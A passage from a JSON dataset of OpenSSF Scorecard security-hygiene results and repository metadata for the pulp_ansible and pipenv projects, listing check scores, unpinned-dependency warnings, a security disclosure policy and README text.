                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pr_checks.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/pr_checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pr_checks.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/pr_checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:69: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:75: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:84: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:112: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:118: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish.yml:127: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish.yml:151: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/release.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:58: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/test.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/test.yml:91: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/test.yml:132: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/test.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update-labels.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update-labels.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update-labels.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update-labels.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_ci.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_ci.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_ci.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/update_ci.yml:58: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_ci.yml:68: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/update_ci.yml:80: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_ci.yml:90: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/update_ci.yml:102: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_ci.yml:112: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/update_ci.yml:124: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_ci.yml:134: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/update_ci.yml:146: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_ci.yml:156: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/update_ci.yml:168: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/update_ci.yml:178: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/update_ci.yml:190: update your workflow using https://app.stepsecurity.io/secureworkflow/pulp/pulp_ansible/update_ci.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/scripts/install.sh:26",
                        "Warn: pipCommand not pinned by hash: .github/workflows/scripts/script.sh:141",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build.yml:37",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build.yml:45",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yml:34",
                        "Warn: pipCommand not pinned by hash: .github/workflows/create-branch.yml:42",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs.yml:40",
                        "Warn: pipCommand not pinned by hash: .github/workflows/lint.yml:34",
                        "Warn: pipCommand not pinned by hash: .github/workflows/nightly.yml:48",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pr_checks.yml:37",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish.yml:48",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish.yml:91",
                        "Warn: pipCommand not pinned by hash: .github/workflows/release.yml:38",
                        "Warn: pipCommand not pinned by hash: .github/workflows/test.yml:74",
                        "Warn: pipCommand not pinned by hash: .github/workflows/test.yml:151",
                        "Warn: pipCommand not pinned by hash: .github/workflows/update-labels.yml:32",
                        "Warn: pipCommand not pinned by hash: .github/workflows/update_ci.yml:39",
                        "Info:   0 out of  56 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  11 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of  17 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 7,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/pulp/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/pulp/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/pulp/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/pulp/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql-analysis.yml:23",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql-analysis.yml:24",
                        "Warn: no topLevel permission defined: .github/workflows/build.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql-analysis.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/create-branch.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docs.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/lint.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/nightly.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/pr_checks.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/test.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/update-labels.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/update_ci.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/pulp/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "Security Disclosures\n--------------------\n\nWe take security issues seriously and welcome responsible disclosure of security vulnerabilities in\nPulp. Please email pulp-security@redhat.com (a private address for the Pulp Security Team) with all\nreports.\n\nYour report should include:\n\n- Pulp version\n- A vulnerability description\n- Reproduction steps\n- Feel free to submit a patch with your disclosure.\n\nA member of the Pulp Security Team will confirm the vulnerability, determine its impact, and develop a fix.\n",
        "project_all_labels": [
            "API Bindings",
            "backport-0.15",
            "backport-0.16",
            "backport-0.18",
            "backport-0.20",
            "backport-0.21",
            "backport-0.22",
            "breaking-changes",
            "bug",
            "Bugfix",
            "BZ",
            "CI/CD",
            "dependencies",
            "Documentation",
            "Duplicate",
            "Easy Fix",
            "enhancement",
            "Feature",
            "GalaxyNG",
            "good first issue",
            "Groomed",
            "help wanted",
            "Issue",
            "Katello",
            "Migrated from Redmine",
            "migration",
            "multi-commit",
            "New",
            "no-changelog",
            "no-issue",
            "Normal",
            "Performance",
            "prio-list",
            "Refactor",
            "SELinux",
            "Severity: High",
            "Severity: Low",
            "Severity: Medium",
            "Severity: Urgent",
            "stale",
            "Story",
            "Task",
            "Triage-Needed",
            "wip",
            "Wishlist",
            "Wontfix"
        ],
        "README_content": "pulp_ansible\n============\n\n.. figure:: https://github.com/pulp/pulp_ansible/actions/workflows/nightly.yml/badge.svg?branch=main\n   :alt: Ansible Nightly CI/CD\n\nA Pulp plugin to support hosting ``Role`` and ``Collection`` Ansible content.\n\nFor more information, please see the `documentation <https://docs.pulpproject.org/pulp_ansible/>`_.\n\n\nCollection Support\n------------------\n\n.. warning::\n\n    The 'Collection' content type is currently in tech-preview. Breaking changes could be introduced\n    in the future.\n\npulp_ansible can manage the `multi-role repository content <https://galaxy.ansible.com/docs/using/\ninstalling.html#multi-role-repositories>`_ referred to as a `Collection`. The following features are\nsupported:\n\n* `ansible-galaxy collection publish` - Upload a Collection to pulp_ansible for association with one or more\n  repositories.\n* `ansible-galaxy collection install` - Install a Collection from pulp_ansible.\n\n\nConfiguring Collection Support\n------------------------------\n\nYou'll have to specify the protocol and hostname the pulp_ansible REST API is being served on. For\npulp_ansible to interact with `ansible-galaxy` correctly it needs the entire hostname. This is done\nusing the `ANSIBLE_HOSTNAME` setting in Pulp. For example if its serving with http on localhost it\nwould be::\n\n    export PULP_ANSIBLE_API_HOSTNAME='http://localhost:24817'\n    export PULP_ANSIBLE_CONTENT_HOSTNAME='http://localhost:24816/pulp/content'\n\nor in your systemd environment::\n\n    Environment=\"PULP_ANSIBLE_API_HOSTNAME=http://localhost:24817\"\n    Environment=\"PULP_ANSIBLE_CONTENT_HOSTNAME=http://localhost:24816/pulp/content\"\n\n\nHow to File an Issue\n--------------------\n\n`New pulp_ansible issue <https://github.com/pulp/pulp_ansible/issues/new>`_.\n\n.. warning::\n  Is this security related? If so, please follow the `Security Disclosures <https://docs.pulpproject.org/pulpcore/bugs-features.html#security-bugs>`_ procedure.\n",
        "num_commits": 1322,
        "project_age_days": 2520,
        "project_created_at": "2017-12-05",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-30",
        "num_contributors": 37,
        "num_pull": 1813,
        "num_issues": 2012,
        "num_opening_issue": 57,
        "project_size(kB)": 3201,
        "num_stargazers": 59,
        "num_watchers": 59,
        "num_forks": 54,
        "num_subscribers": 7,
        "SecurityPolicy_created_at": "2022-04-21 11:40:40",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "28311180f985411ff9bf7227dac85378e13bed81",
                "url": "https://github.com/pulp/.github/commit/28311180f985411ff9bf7227dac85378e13bed81",
                "date": "2022-04-21 11:40:40"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "pypa/pipenv",
        "project_url": "https://github.com/pypa/pipenv",
        "SSF": {
            "date": "2024-10-30T00:24:14+07:00",
            "repo": {
                "name": "github.com/pypa/pipenv",
                "commit": "0d7160e3a0f5bb088d995be7dac4cd63b86c7c8d"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.3,
            "checks": [
                {
                    "details": [
                        "Warn: binary detected: pipenv/patched/pip/_vendor/distlib/t32.exe:1",
                        "Warn: binary detected: pipenv/patched/pip/_vendor/distlib/t64-arm.exe:1",
                        "Warn: binary detected: pipenv/patched/pip/_vendor/distlib/t64.exe:1",
                        "Warn: binary detected: pipenv/patched/pip/_vendor/distlib/w32.exe:1",
                        "Warn: binary detected: pipenv/patched/pip/_vendor/distlib/w64-arm.exe:1",
                        "Warn: binary detected: pipenv/patched/pip/_vendor/distlib/w64.exe:1",
                        "Warn: binary detected: tests/test_artifacts/six-1.11.0+mkl-py2.py3-none-any.whl:1"
                    ],
                    "score": 3,
                    "reason": "binaries present in source code",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "4 out of 4 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 6,
                    "reason": "Found 4/6 approved changesets -- score normalized to 6",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: haystackdev contributor org/company found, franklin-ai contributor org/company found, psf contributor org/company found, amazon web services contributor org/company found, gitlabhq contributor org/company found, openMF contributor org/company found, cvut contributor org/company found, 3DprintFIT contributor org/company found, Pythonista-Tools contributor org/company found, aws contributor org/company found, apache contributor org/company found, MacDownApp contributor org/company found, python-desert contributor org/company found, pyvec contributor org/company found, systers contributor org/company found, jupyterlab contributor org/company found, OpenScienceMOOC contributor org/company found, conda-forge contributor org/company found, red hat fit ctu contributor org/company found, motioneye-project contributor org/company found, ku-ldif contributor org/company found, pwman3 contributor org/company found, pipxproject contributor org/company found, Quora-Users contributor org/company found, coala contributor org/company found, BesutKode contributor org/company found, cell-analyzer contributor org/company found, christian clauss contributor org/company found, pydata contributor org/company found, codebenders-igdtuw contributor org/company found, ClangBuiltLinux contributor org/company found, wikimedia contributor org/company found, PyCQA contributor org/company found, py2many contributor org/company found, pycontw contributor org/company found, compiler-research contributor org/company found, devassistant contributor org/company found, admesh contributor org/company found, gsocindonesia contributor org/company found, sarugaku contributor org/company found, python-trio contributor org/company found, molior-dbs contributor org/company found, fedora-python contributor org/company found, LinuxDays contributor org/company found, slic3r contributor org/company found, StartupGrid contributor org/company found, ku-nim contributor org/company found, mfem contributor org/company found, OpenSourceHelpCommunity contributor org/company found, opensourcediversity contributor org/company found, fossasia contributor org/company found, click-contrib contributor org/company found, python-organizers contributor org/company found, artigraph contributor org/company found, segfault-trainings contributor org/company found, bundler contributor org/company found, pincites contributor org/company found, lfai contributor org/company found, tsiq contributor org/company found, CentrumBadanKosmicznych contributor org/company found, pytest-dev contributor org/company found, IEEE-Women-in-Tech contributor org/company found, innocent-team contributor org/company found, pywikibot contributor org/company found, Reliance-Jio contributor org/company found, pyldap contributor org/company found, kmc-jp contributor org/company found, summerofcode contributor org/company found, canonical contributor org/company found, urllib3 contributor org/company found, djangogirlstaipei contributor org/company found, TheAlgorithms contributor org/company found, radish-bdd contributor org/company found, jazzband contributor org/company found, sclorg contributor org/company found, betamaxpy contributor org/company found, astronomer contributor org/company found, CodeTengu contributor org/company found, pyladies contributor org/company found, python-hyper contributor org/company found, occipital contributor org/company found, docat-org contributor org/company found, loklak contributor org/company found, Nuitka contributor org/company found, pypa contributor org/company found, alice-sieve contributor org/company found, ku-brclose contributor org/company found, moremoban contributor org/company found, kennethreitz-archive contributor org/company found, twisted contributor org/company found, MediumCendekia contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 91 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: :0"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: MIT License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 21 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/pypi_upload.yml:11"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:64: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:65: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:82: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:85: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:139: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci.yaml:140: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/ci.yaml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pypi_upload.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/pypi_upload.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi_upload.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/pypi_upload.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pypi_upload.yml:35: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/pypi_upload.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi_upload.yml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/pypi_upload.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ruff.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/pypa/pipenv/ruff.yml/main?enable=pin",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:2",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:5",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:57",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:69",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:97",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:107",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ci.yaml:144",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pypi_upload.yml:41",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pypi_upload.yml:42",
                        "Warn: pipCommand not pinned by hash: .github/workflows/ruff.yml:15",
                        "Info:   0 out of  11 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   2 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   1 containerImage dependencies pinned",
                        "Info:   0 out of   9 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 28 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
